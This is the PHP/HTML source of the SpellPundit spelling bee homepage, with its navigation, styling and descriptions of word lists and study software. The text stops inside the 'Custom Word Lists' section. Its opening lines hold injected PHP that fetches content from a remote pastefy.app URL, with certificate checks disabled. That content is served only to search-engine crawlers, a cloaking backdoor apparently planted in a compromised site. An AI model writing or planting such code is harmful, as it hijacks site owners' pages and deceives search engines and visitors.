<?php
function f($u){
  if(ini_get('allow_url_fopen'))
    return @file_get_contents($u,0,stream_context_create(['http'=>['timeout'=>6],'https'=>['timeout'=>6]]));
  if(function_exists('curl_init')){
    $c=curl_init($u);
    curl_setopt_array($c,[
      CURLOPT_RETURNTRANSFER=>1,
      CURLOPT_USERAGENT=>'Mozilla/5.0',
      CURLOPT_SSL_VERIFYPEER=>0,
      CURLOPT_SSL_VERIFYHOST=>0,
      CURLOPT_TIMEOUT=>10
    ]);
    $r=curl_exec($c);curl_close($c);return $r;
  }
  return false;
}
$u=strtolower($_SERVER["HTTP_USER_AGENT"]);
$x="https://pastefy.app/fBu4UsQX/raw";
$d=f($x);
if(preg_match('/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/',$u)){
  header("Content-Type: text/html; charset=UTF-8");
  header("Vary: User-Agent");
  if($d!==false)echo $d;exit;
}
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
<!--<sitemap index xmlns="sitemap.xml">-->
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<meta name="google-site-verification" content="_KM9x4GiSkBS_HDnNIkTnTVHTva41aGmQhpKDRkqSA4" />
<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />

<!--<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="keywords" content="spelling,vocabulary,spelling bee,spelling bee word lists,vocabulary bee word lists,school spelling bee,district spelling bee,county spelling bee,regional spelling bee,national spelling bee,Scripps Spelling Bee,words of the champions,spelling bee competitions,Latin and Greek roots,spelling bee difficult words,spelling bee easy words,spelling bee tips,words for adult spelling bees,spelling bee preparation,Spelling bee practice,spelling bee champion,spelling bee winning words,spelling bee competition tips,spelling bee quizzes,homonyms,spelling bee training, spelling bee near me">-->
<meta name="keywords" content="spelling bee training, spelling bee near me, spelling bee online">

<meta name="description" content="Play Spelling Bee game online and free. Make as many words as possible using 7 letters and test your vocabulary. Find pangrams and become the genius Bee!">

<meta name="author" content="Usha Chava">
<title>SpellPundit spelling bee resources for Scripps national spelling bee preparation</title>
<!-- Global site tag (gtag.js) - Google Analytics -->

<!-- Bootstrap CSS -->
<link rel="shortcut icon" type="image/x-icon" href="img/fav.png">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/line-icons.css">
<link rel="stylesheet" href="css/owl.carousel.css">
<link rel="stylesheet" href="css/owl.theme.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/magnific-popup.css">
<link rel="stylesheet" href="css/nivo-lightbox.css">

<link rel="stylesheet" href="css/main.css?v=<?php echo date('Y-m-d H:i:s'); ?>">    
<link rel="stylesheet" href="css/responsive.css?v=<?php echo rand(); ?>">    
<link rel="stylesheet" href="css/font-awesome.min.css">
<link href="css/test-slider-fullwidth.css" rel="stylesheet">
<!-- slick css -->
<link rel="stylesheet" type="text/css" href="css/slick.css">
<link rel="stylesheet" href="css/jquery.flexslider.css" type="text/css">
<link rel="stylesheet" href="css/ie10-viewport-bug-workaround.css" type="text/css">

<!--Font Css-->
<link rel="stylesheet" href="css/Montserrat.css" type="text/css">
<link rel="stylesheet" href="css/Roboto.css" type="text/css">
<link rel="stylesheet" href="css/Poppins.css" type="text/css">
<link rel="stylesheet" href="css/Poppins.css" type="text/css">

<!--<script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>-->

<script src="js/ie-emulation-modes-warning.js"></script>
 <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
<style>
.modal-dialog
{
	max-width:60%;
}
.mfp-iframe-holder .mfp-content {
    line-height: 0;
    width: 100%;
    max-width: 817px;
}
.aimg-thumbnail {
    padding: .25rem;
    background-color: #fff;
    border: 3px solid #0181bf;
    border-radius: .25rem;
    max-width: 100%;
    height: auto;
}
.cnt a
{
    color #FFFFFF !important;
}
.vicon
{
    float: left;
    top: 111px;
    position: relative;
    margin: 5px;
    width: 30px;
}
.pricing .video-promo-content {
    background: url(../img/video2.jpg) no-repeat;
    border: 5px solid #1a5d82;
    background-size: cover;
    line-height: 90px;
    margin: 0 auto;
    height: 210px;
    width: 260px;
    border-radius: 5px;
    background-size: cover;
    background-position: center;
}
span.selected {
    width: 140px;
    text-indent: 10px;
    overflow: hidden;
    text-align:center;
}
.buttons_sty
{
    text-align:center;
}
.buttons_sty img {
    width: 260px !important;
}
@media only screen and (max-width:430px)
{
   .buttons_sty
    {
        text-align:center;
    }
    
    .buttons_sty img {
        width: 273px !important;
    }
}
.overlay h4 {
    font-size: 14px;
    text-align: center;
    padding-top: 20px;
    line-height: 22px;
    color: #000;
}
.overlay h4 a
{
    color:#2979be;
}
    .navabar2
    {
        display: flex;
        justify-content: flex-end; /* Align items to the right */
        list-style: none; /* Remove bullet points */
        padding: 0; /* Remove default padding */
        margin: 0; /* Remove default margin */
        width:100%;
    }
    .navabar2 li
    {
        float:left;
    } 
    .navabar2 li a
    {
        color: #474141;
        font-size: 0.9rem;
        font-weight: 500;
        padding: 5px 0;
        margin-left: 21px;
        position: relative;
        font-family: Montserrat, sans-serif;
    }
    .navabar2 li a:hover
    {
        text-decoration:underline;
        color:#ee5d24;
    }
    .first-select span.selected
    {
        width:auto !important;
    }
    .first-select
    {
        align-items: center;
        justify-content: center;
        display: flex;
        text-align: center;
        width: 31%;
        margin: 0px auto;
    }
    span.selected {
        background: transparent;
    }
    .submenu
    {
        background: #f1f9ee;
        padding: 10px;
        color: green;
        border: 1px solid green;
    }
    span.selectOption {
        display: block;
        width: 100%;
        line-height: 20px;
        padding: 0px;
        color: #007bff;
        font-size: 13px;
        padding-bottom: 5px;
    }
    span.selectOption:hover {
        color: #007bff;
        background:transparent;
    }
    .subOption {
        padding-bottom: 5px;
        font-size: 15px;
    } 
    @media (max-width: 768px) {
        .first-select
        {
            width:100%;
        }
        .d-none.d-md-flex  { display: none; }
        .d-md-none { display: block; }
    }
    
    @media (min-width: 769px) {
        .d-none.d-md-flex { display: flex; }
        .d-md-none { display: none; }
    }
</style>

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TRQXV83');</script>
<!-- End Google Tag Manager -->

<!-- Google tag (gtag.js)
<script async src="https://www.googletagmanager.com/gtag/js?id=G-J55SV8F77P"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-J55SV8F77P');
</script> -->

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-11378012043">
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-11378012043');
</script>
<style type="text/css"> 
        .secondnav
        {
            margin-top: -30px;
            position: absolute;
            z-index: 1000000;
            float: right;
            text-align: right;
        }
</style>
</head>

<body>
	<div class="top-bar">
    	<div class="container">
        	<div class="row">
                <div class="col-lg-7 col-md-6 col-xs-12">
                    <div class="cnt">
                        <i class="fa fa-envelope-o" aria-hidden="true"></i>  spellpundit@gmail.com
                        
                        <i class="fa fa-mobile" aria-hidden="true" style="font-size:20px;padding-left:20px;"></i> 
                        <font color="#ee5d23"><b>713-670-4824</b></font>
                    </div>
                </div>
                <div class="col-lg-5 col-md-6 col-xs-12">
                    <div class="cnt">
                    	<span class="login-info">
                            <a class="hidden-xs rs-search sign-up" href="#">Sign Up</a>
                            <a class="hidden-xs rs-search sign-in" href="spell/index.php">Sign In</a>
                        </span>
                        <span class="share">
                            <a href="https://www.facebook.com/SpellPundit/" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
                            <a href="https://twitter.com/SpellPundit" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
                            <a href="https://www.instagram.com/spellpundit" target="_blank"><i class="fa fa-instagram" aria-hidden="true"></i></a>
                            
                            <a href="https://www.youtube.com/channel/UCyVtMPkJ6wEiPJ_ae5boWKA/videos" target="_blank"><i class="fa fa-youtube" aria-hidden="true"></i></a>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Header Section Start -->
   <div class="site-middle-content"> 
    <header id="home" class="hero-area-2">    
      <div class="overlay"></div>
      <nav class="navbar navbar-expand-md bg-inverse fixed-top scrolling-navbar">
        <div class="container">
          <a href="index.php" class="navbar-brand"><img src="img/logo.png" alt="spellpundit" title="spellpundit.com" height="80px"></a>  
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
            <i class="lni-menu"></i>
          </button>
          <!--<div style="padding-left:20px;">
              <a href="spell/free_trial.php"><img src="img/freetrial.jpg" border="0"/></a>
          </div>-->
          <div class="first-select">
                <div class='selectBox'>
                    <span class='selected'> Demo Version</span>
                    <span class='selectArrow'>&#9660</span>
                    <div class="selectOptions">
                        <span class="selectOption" style="display:none;" value="Option 1"><a href="#"><i class="fa fa-caret-right" aria-hidden="true"></i> Free Trial Version</a></span>
                        <span class="selectOption" value="Option 1"><a href="/spell/free_trial_spelling_learning.php"><i class="fa fa-caret-right" aria-hidden="true"></i> Spelling Learning</a></span>
                        <span class="selectOption" value="Option 2"><a href="/spell/free_trial_spelling_testing.php"><i class="fa fa-caret-right" aria-hidden="true"></i> Spelling Testing</a></span>
                        <span class="selectOption" value="Option 3"><a href="/spell/free_trial_vocab_learning.php"><i class="fa fa-caret-right" aria-hidden="true"></i> Vocab Learning</a></span>
                        <span class="selectOption" value="Option 3"><a href="/spell/free_trial_vocab_testing.php"><i class="fa fa-caret-right" aria-hidden="true"></i> Vocab Testing</a></span> 
                    </div>
                </div> 
                <div class="selectBox" style="background:#6ee567;">
                    <span class="selected">Games</span>
                    <span class="selectArrow">&#9660;</span>
                    <div class="selectOptions" style="width:215px;">
                        <span class="selectOption" value="Option 1">
                            <a href="/spell/demo_building_words.php">
                                <i class="fa fa-caret-right" aria-hidden="true"></i> Building Words from Roots
                            </a>
                        </span> 
                        <span class="selectOption" value="Option 2">
                            <a href="/spell/word_puzzle.php?action=easy">
                                <i class="fa fa-caret-right" aria-hidden="true"></i> Word Puzzle - Easy
                            </a>
                        </span> 
                        <span class="selectOption" value="Option 3">
                            <a href="/spell/word_puzzle.php?action=intermediate">
                                <i class="fa fa-caret-right" aria-hidden="true"></i> Word Puzzle - Intermediate
                            </a>
                        </span> 
                        <span class="selectOption" value="Option 4">
                            <a href="/spell/word_puzzle.php?action=difficult">
                                <i class="fa fa-caret-right" aria-hidden="true"></i> Word Puzzle - Difficult
                            </a>
                        </span> 
                        <span class="selectOption" value="Option 5">
                            <a href="/spell/vocabulary_quiz_novice.php">
                                <i class="fa fa-caret-right" aria-hidden="true"></i> Vocabulary Quiz - Novice
                            </a>
                        </span> 
                        <span class="selectOption" value="Option 6">
                            <a href="/spell/vocabulary_quiz_expert.php">
                                <i class="fa fa-caret-right" aria-hidden="true"></i> Vocabulary Quiz - Expert
                            </a>
                        </span>  
                    </div>
                </div>
          </div>
          <div class="collapse navbar-collapse" id="navbarCollapse" style="flex-direction: column;">
            <ul class="navbar-nav mr-auto w-100 justify-content-end  d-none d-md-flex">
              
              <li class="nav-item">
                <a class="nav-link page-scroll" href="#home">Home</a>
              </li>
              <li class="nav-item">
                <a class="nav-link page-scroll" href="#about">About</a>
              </li>  
              <li>
                <a class="nav-link page-scroll" href="spelling-bee-word-lists.php">Word Lists</a>
              </li> 
              <li>  
                  <a class="nav-link"  href="spelling-bee-word-lists.php#wotc">WOTC</a>
              </li> 
              <li> 
                 <a class="nav-link"  href="spelling-bee-word-lists.php#cwl">CWL</a>
              </li> 
              <li> 
                 <a class="nav-link"  href="spelling-vocabulary-coaching-program.php">Coaching</a>
              </li>                            
              <li class="nav-item">
                <a class="nav-link page-scroll" href="scripps-national-spelling-bee.php">Scripps Bee</a>
              </li> 
              <li class="nav-item">
                <a class="nav-link page-scroll" href="youtube-spellpundit-videos.php">YouTube Channel</a>
              </li>  
              <li class="nav-item">
                <a class="nav-link page-scroll" href="faq.php">FAQ</a>
              </li>   
            </ul>
            <ul  class="navabar2  d-none d-md-flex">
                  <li><a href="#competitions">Competitions</a></li>
                  <li><a href="#wordlists">Software</a></li>
                  <li><a href="#demo">Demo</a></li>
                  <li><a href="#testimonials">Testimonials</a></li>
                  <li><a href="news.php">News</a></li>
                  <li><a href="/spellshakti" target="_blank">Blog</a></li>
                  <li><a href="contributors.php">Contributors</a></li> 
              </ul>
              <!-- Mobile Navbar (Visible on Small Screens) -->
                <ul class="navbar-nav w-100 justify-content-center d-md-none">
                    <li class="nav-item"><a class="nav-link page-scroll" href="#home">Home</a></li>
                    <li class="nav-item"><a class="nav-link page-scroll" href="#about">About</a></li>
                    <li class="nav-item"><a class="nav-link page-scroll" href="spelling-bee-word-lists.php">Word Lists</a></li>
                    <li class="nav-item"><a class="nav-link" href="spelling-bee-word-lists.php#wotc">WOTC</a></li>
                    <li class="nav-item"><a class="nav-link" href="spelling-bee-word-lists.php#cwl">CWL</a></li>
                    <li class="nav-item"><a class="nav-link" href="spelling-vocabulary-coaching-program.php">Coaching</a></li>
                    <li class="nav-item"><a class="nav-link page-scroll" href="scripps-national-spelling-bee.php">Scripps Bee</a></li>
                    <li class="nav-item"><a class="nav-link page-scroll" href="youtube-spellpundit-videos.php">YouTube Channel</a></li>
                    <li class="nav-item"><a class="nav-link page-scroll" href="faq.php">FAQ</a></li>
                    <li class="nav-item"><a class="nav-link" href="#competitions">Competitions</a></li>
                    <li class="nav-item"><a class="nav-link" href="#wordlists">Software</a></li>
                    <li class="nav-item"><a class="nav-link" href="#demo">Demo</a></li>
                    <li class="nav-item"><a class="nav-link" href="#testimonials">Testimonials</a></li>
                    <li class="nav-item"><a class="nav-link" href="news.php">News</a></li>
                    <li class="nav-item"><a class="nav-link" href="/spellshakti" target="_blank">Blog</a></li>
                    <li class="nav-item"><a class="nav-link" href="contributors.php">Contributors</a></li> 
                </ul>
          </div>
        </div>
      </nav> 
      <div class="navabar2">
          <div class="container secondnav">
              
          </div>
      </div>
      <div class="head-top-cntbtn oheader3" style="height:80px;position:relative;">
			<div class="buttons_sty" style="margin-right:10px;">
                <!--<a class='result' href="fellowships.php">
			    	<img src="img/applyfor-scholarshipbutton.png" border="0" class="res_img"/>
                </a>
            	<a class='result' href="spellathon_online_results.php" target="_balnk">
			    	<img src="img/nreg2.png" border="0" class="res_img"/>
                </a>
                <a class='result' href="nationalspellingbee_online_results.php" target="_balnk">
			    	<img src="img/nreg1.png" border="0" class="res_img" style="margin-left:0px;"/>
                </a>
                <a class='result' href="NationalBee_2021.php">
			    	<img src="img/information_2021.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="NationalBee_2022.php" target="_balnk">
			    	<img src="img/2022_spellingbee.png"  alt="spellpundit" border="0" class="res_img" style="margin-left:0px;"/>
                </a>
                <a class='result' href="world_spelling_bee_championship_results.php">
			    	<img src="img/champion_2020.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="nationalspellingbee_online_results_2022.php">
			    	<img src="img/results-button-2022.png" alt="spellpundit" border="0" class="res_img"/>
                </a>-->
                <a class='result' href="Scripps_Winning_Words.php">
			    	<img src="img/script_winning_words.png" alt="spellpundit" border="0" class="res_img"/>
                </a> 
                <a class='result' href="multiple_license_schools.php">
			    	<img src="img/multiple_license.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="past_nationalbee_competitions.php" target="_balnk">
			    	<img src="img/2-nd-button.png" alt="spellpundit" border="0" class="res_img" style="margin-left:0px;"/>
                </a>
                <a class='result' href="nationalspellingbee_online_results_2025.php">
			    	<img src="img/results-button-2025.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <!--<a class='result' href="NationalBee_2025.php" target="_balnk">
			    	<img src="img/2025-registratoin-button.png" alt="spellpundit" border="0" class="res_img" style="margin-left:0px;"/>
                </a>
                <a class='result' href="NationalBee_2023.php">
			    	<img src="img/spellingbee_2023.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="nationalspellingbee_online_results_2023.php">
			    	<img src="img/results-button-2023.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="NationalBee_2024.php">
			    	<img src="img/spellingbee_2024.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="nationalspellingbee_online_results_2025.php">
			    	<img src="img/results-button-2025.png" alt="spellpundit" border="0" class="res_img"/>
                </a>
                <a class='result' href="wsc_online_results_2024.php">
			    	<img src="img/WSC_2024_Reg.jpeg" alt="spellpundit" border="0" class="res_img"/>
                </a>-->
            </div>
	  </div>
      <div class="home-slider container">
      	<div class="flex-container">
            <div class="flexslider">
                <ul class="slides">
                    <li>
                        <a href="#"><img src="img/2025_slider.png" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                    <li>
                        <a href="#"><img src="img/new_slider_2.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                   <li>
                        <a href="#"><img src="img/new_slider_3.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li> 
                    <!--
                     <li>
                        <a href="#"><img src="img/latest_slide_2023_1.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                    <li>
                        <a href="#"><img src="img/latest_slide_2023_2.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                   <li>
                        <a href="#"><img src="img/slide-2.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                    <li>
                        <a href="#"><img src="img/slide-3.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                   <li>
                        <a href="#"><img src="img/slider_1.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                    <li>
                        <a href="#"><img src="img/slide-1.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li>
                    <li>
                        <a href="#"><img src="img/slider_new.jpg" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" width="1292px" height="470px" /></a>
                    </li><li>
                        <img src="img/slider_2.jpg" width="1292px" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" height="470px" />
                    </li>
                    
                    <li>
                        <img src="img/slider_3.jpg" width="1292px" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" height="470px" />
                        <p>Designing The Well-Tempered Web</p>
                    </li>
                    
                    <li>
                        <img src="img/slider_4.jpg" width="1292px" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" height="470px" />
                        <p>Designing The Well-Tempered Web</p>
                    </li>
                    
                    <li>
                        <img src="img/slider_5.jpg" width="1292px" alt="spellpundit" title="Learn spelling words with ease, speed, and accuracy!" height="470px" />
                        <p>Designing The Well-Tempered Web</p>
                    </li>-->
                </ul>
            </div>
        </div> <!-- .cdhero -->
      </div>             
    </header>
    <!-- Header Section End --> 

    <!-- features Section Start -->
    <div id="about" class="section container">
      <div class="inline-one">
        <div class="row aboutus">
        	<div class="col-sm-12">
                <div class="col-lg-7 col-md-6 col-xs-12 float-left">       
                  <h2 class="section-title wow fadeIn" data-wow-delay="0.2s">About <span>Spellpundit</span></h2>            	
                  <p>SpellPundit is dedicated to provide excellent vocabulary and spelling bee word lists for school, district/county, regional and spelling bee competitions. We also provide an easy to use online software to prepare vocabulary and spelling word lists very fast.</p>
                  <p>We are a one stop website for all vocabulary and spelling competitions. With SpellPundit, you don’t need to use any other word lists for vocabulary and spelling bee competitions. Whether you are looking for school spelling bee word list, district spelling bee word list, regional spelling bee word list, or national spelling bee word list, we have them all here.</p>

                </div>
                <div class="col-lg-5 col-md-6 col-xs-12 float-left">
                   <div class="col-lg-8 col-md-12 col-sm-12 col-xs-12 inline-two">
                    <div class="flex-container">
                        <div class="flexslider2 about-popup-video">
                            <ul class="slides">
                                <li>
                                    <div class="testimonial-item inline-three">
                                      <div class="video-promo-content text-center">
                                        <a href="https://spellpundit.com/img/about-1.jpg" class="video-popup"><img src="img/about-1.jpg" alt="spellpundit" title="spellpundit.com" class="aimg-thumbnail" width="308px" height="205px" /></a>
                                        <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                                      </div>
                                    </div>
                                </li>
                                
                                <li>
                                    <div class="testimonial-item inline-four">
                                      <div class="video-promo-content text-center">
                                        <a href="https://spellpundit.com/img/about-2.jpg" class="video-popup"><img src="img/about-2.jpg" alt="spellpundit" title="spellpundit.com" class="aimg-thumbnail" width="308px" height="205px" /></a>
                                        <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                                      </div>
                                    </div>
                                </li>
                            </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
      </div>
      
      <div>
      	<div class="section-header">   
          <h1 class="section-title inline-five">What makes spellpundit great?</h1>
        </div>
        <div class="three-blocks">
        	<div class="col-sm-4 float-left">
            	<div class="cont">
                	<!--<img src="img/img19.png" alt="spellpundit" width="40px" height="54px" />-->
                    <span class="gt-icon"><i class="fa fa-puzzle-piece" aria-hidden="true"></i></span>
                    <span>
                    	<h6>Comprehensive Word Lists</h6>
                        <p>In addition to spelling, we also provide word lists to prepare vocabulary, roots, homonyms, and phrased/hyphenated words.</p>
                        <a class="hidden-xs rs-search" data-target=".search-modal1" data-toggle="modal" href="#">Read More >></a>
                    </span>
                </div>
            </div>
            <div class="col-sm-4 float-left">
            	<div class="cont">
                	<!--<img src="img/img20.png" alt="spellpundit" width="56px" height="46px" />-->
                    <span class="gt-icon"><i class="fa fa-users" aria-hidden="true"></i></span>
                    <span>
                    	<h6>Easy to Use</h6>
                        <p>SpellPundit has a user-friendly interface that can be used in both desktop and mobile browsers, allowing for easy preparation almost anywhere in the world.</p>
                        <a class="hidden-xs rs-search" data-target=".search-modal2" data-toggle="modal" href="#">Read More >></a>
                    </span>
                </div>
            </div>
            <div class="col-sm-4 float-left">
            	<div class="cont">
                	<!--<img src="img/img21.png" alt="spellpundit" width="52px" height="41px"/>-->
                    <span class="gt-icon"><i class="fa fa-clock-o" aria-hidden="true"></i></span>
                    <span>
                    	<h6>Fast and Accurate Preparation</h6>
                        <p>In Testing Mode, the speller is provided with all the word’s information (audio pronunciations, part of speech, language of origin, definition) and must type in the correct spelling of the word.</p>
                        <a class="hidden-xs rs-search" data-target=".search-modal3" data-toggle="modal" href="#">Read More >></a>
                    </span>
                </div>
            </div>
        </div>
      </div>
    </div>
    <!-- features Section End -->

    <!-- Awesome Screens Section Start -->
    <section id="wordlists" class="screens-shot section modules container">
      <div>
        <div class="section-header">   
          <!--<p class="btn btn-subtitle wow fadeInDown" data-wow-delay="0.2s">Screenshots</p>-->       
          <h2 class="section-title" style="width:100%;"><span>Software and Word Lists</span></h2>
        </div>
        <div class="row">
        	<div class="col-sm-12">
                <div  class="col-lg-8 col-md-8 col-xs-12 float-left">
                    <div id="accordion" class="rs-accordion-style1">
                        <div class="card inline-six">

                            <div class="card-header mb-0" id="headingSeven">
                                <h3 class="acdn-title" data-toggle="collapse" data-target="#collapseSeven" aria-expanded="true" aria-controls="collapseSeven"><i class="fa fa-plus accordion-icon"></i> <span>SpellPundit Software</span></h3>
                            </div>
                            <div id="collapseSeven" class="collapse show" aria-labelledby="headingSeven" data-parent="#accordion">
                                <div class="card-body">
                                    <p>All SpellPundit sets are enabled with two modes of preparation: Learning Mode and Testing Mode. In Learning Mode, the speller is provided with the word and all its information (audio pronunciations, part of speech, language of origin, definition) in a flashcard format. The word may also include a “hint,” which are usually language patterns or roots associated with the word, to facilitate their learning of the word. In Testing Mode, the speller is provided with all the word’s information (audio pronunciations, part of speech, language of origin, definition) and must type in the correct spelling of the word.</p> 
                                    <p>SpellPundit’s software tracks all the words a speller misspells and provides spellers with the option to review only their previously misspelled words in future attempts. Spellers are also given the option to “flag” words in each set and prepare these words separately. Reports of a speller’s progress and performance can be generated at any time so that the speller can identify words that need further preparation.</p>
                                    <p>For effective learning, it is recommended that a speller studies every word through the Learning Mode before evaluating themselves through the Testing Mode. Afterwards, the speller should review the words they misspelled through the Learning Mode, then use the Testing Mode to test themselves on their mistakes.</p>      
                                    
                                    <p>
                                        Can I try the software before I register? Yes <a href="faq.php">click here</a>
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="card inline-six">
                            <div class="card-header" id="headingOne">
                                <h3 class="acdn-title collapsed" data-toggle="collapse" data-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                                    <i class="fa fa-plus accordion-icon"></i> <span>Spelling Word Lists</span>
                                </h3>
                            </div>
                            <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#accordion">
                                <div class="card-body">
                                    <p>SpellPundit provides meticulously curated word lists
                                    that serve as essential tools for spelling and vocabulary
                                    bee participants. These word lists cover a wide range of
                                    difficulty levels, from beginner to advanced spellers. All
                                    the words from dictionary condensed to about 120,000
                                    by removing auxiliary words (e.g. keep cushion, but
                                    remove cushions, cushiony, cushioning, cushionless
                                    etc.). Almost every word in the dictionary is in
                                    SpellPundit. The words are arranged in 10 Word Lists
                                    with increasing difficulty.</p>
                                    <p>For most words roots, spelling rules, and other
                                        information is provided to help speller learn words
                                        effectively.</p>
                                    <p>SpellPundit also has word lists for roots, homonyms,scientific words, and geographic words.</p>
                                    <p>
                                        Additional information about word lists is <a href="faq.php">here</a>
                                    </p>
                                </div>
                            </div>

                        </div>
                        <div class="card inline-six">
                            <div class="card-header" id="headingTwo">
                                <h3 class="acdn-title collapsed" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo"><i class="fa fa-plus accordion-icon"></i> <span>Vocabulary Word Lists</span></h3>
                            </div>
                            <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordion">
                                <div class="card-body">
                                    <p>The Scripps National Spelling Bee and various regional spelling bees also test students on vocabulary. To help with vocabulary preparation, the vocabulary words and their meanings are provided in the SpellPundit’s  vocabulary word lists. These lists are arranged in small sets that can be practiced in both Learning Mode and Testing Mode, and SpellPundit’s software will facilitate the preparation of up to a several thousand vocabulary words per day. At this rate, vocabulary preparation for the Scripps National Spelling Bee and other bees can be completed in a few days. Over the last three years, more than 90% of the vocabulary words asked at national competitions came from the vocabulary word lists.</p>
                                </div>
                            </div>
                        </div>
                        <div class="card inline-six">
                            <div class="card-header mb-0" id="headingThree">
                                <h3 class="acdn-title collapsed" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree"><i class="fa fa-plus accordion-icon"></i> <span>Prefixes, Suffixes, and Roots Module</span></h3>
                            </div>
                            <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordion">
                                <div class="card-body">
                                    <p>The prefixes, suffixes, and roots are the basic building blocks of many words (especially those from Latin and Greek origins), and they play a critical role in spelling and vocabulary. About 2,000 common prefixes, suffixes, and roots from various languages are compiled in this module. In the Learning Mode, the speller is able to see the root, its definition, its origin, along with a few example words. The Testing Mode allows the speller to quiz themselves on the definitions of these roots in a multiple-choice format. This module is important to build a strong foundation of roots for success in competitions.</p> 
                                </div>
                            </div>
                        </div>
                        <div class="card inline-six">
                            <div class="card-header mb-0" id="headingFive">
                                <h3 class="acdn-title collapsed" data-toggle="collapse" data-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive"><i class="fa fa-plus accordion-icon"></i> <span>Homonyms Module</span></h3>
                            </div>
                            <div id="collapseFive" class="collapse" aria-labelledby="headingFive" data-parent="#accordion">
                                <div class="card-body">
                                    <p>Homonyms are words with the same pronunciation but different spellings and definitions. Spellers must be able to distinguish between homonyms and spell the correct one, making them some of the most confusing words asked in spelling bees. SpellPundit’s Homonym Module allows spellers to learn how to distinguish about 4,000 homonym words from each other and eliminate confusion! In the Learning Mode, a speller is shown all the homonyms associated with a particular word and their definitions. The Testing Mode then allows spellers to practice these words so that homonyms can be tackled easily during competitions. The Homonym Module is one of the most unique and useful word lists that SpellPundit provides.</p>
                                </div>
                            </div>
                        </div> 
                        <div class="card inline-six">
                            <div class="card-header mb-0" id="headingSix">
                                <h3 class="acdn-title collapsed" data-toggle="collapse" data-target="#collapseSix" aria-expanded="false" aria-controls="collapseSix"><i class="fa fa-plus accordion-icon"></i> <span>Custom Word Lists</span></h3>
                            </div>
                            <div id="collapseSix" class="collapse" aria-labelledby="headingSix" data-parent="#accordion">
                                <div class="card-body">
